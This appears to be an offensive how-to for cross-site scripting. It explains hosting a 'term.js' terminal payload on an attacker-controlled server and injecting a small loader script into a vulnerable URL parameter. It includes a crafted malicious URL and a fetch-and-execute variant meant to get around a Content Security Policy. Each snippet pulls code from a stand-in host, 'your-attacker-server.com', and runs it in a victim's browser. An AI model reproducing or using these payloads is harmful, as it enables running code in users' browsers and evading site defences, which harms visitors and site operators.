term.js | Pop's up a terminal via XSS for direct code input

1. **Save term.js:**

2.  **Host the File:** Place `term.js` on a web server that you control and can access publicly, or at least from the network where the victim browser is. This could be:
    *   A simple Python HTTP server `python -m http.server 8000` on your machine, if accessible.
    *   A dedicated web server (Nginx, Apache).
    *   A cloud hosting service or CDN.
    *   Services like `pastebin`, `gist` (raw view), or specialized payload hosting services, be cautious about terms of service.

    Let's assume you host it at `http://your-attacker-server.com/term.js`.

3.  **Inject the Loader Script:** Now, instead of injecting the *entire* terminal code, you only need to inject a very small `<script>` tag that tells the browser to load your external file:

    ```html
    <script src="http://your-attacker-server.com/term.js"></script>
    ```

    Or, if you need to inject it into a JavaScript context:

    ```javascript
    var s = document.createElement('script');
    s.src = 'http://your-attacker-server.com/term.js';
    document.body.appendChild(s);
    ```

**How to Inject the Loader:**

You would inject this small `<script src="..."></script>` tag into the vulnerable parameter in the URL. Since this loader script is tiny, it will not exceed the URL length limits.

**Example:**

If the vulnerable URL is `http://vulnerable-site.com/search?query=UserInput`, you would craft the malicious URL like this:

`http://vulnerable-site.com/search?query=<script src="http://your-attacker-server.com/term.js"></script>`

Make sure the payload is properly URL-encoded if necessary.

**Alternative: Fetch and Execute. If `<script src>` is blocked by CSP**

If the site has a Content Security Policy that prevents loading scripts from external domains `script-src 'self'`, but *might* allow fetching data `connect-src`, you could try fetching the script and executing it:

```html
<script>
  fetch('http://your-attacker-server.com/term.js')
    .then(response => response.text())
    .then(code => { new Function(code)(); })
    .catch(err => console.error('Payload fetch/exec failed:', err));
</script>
```
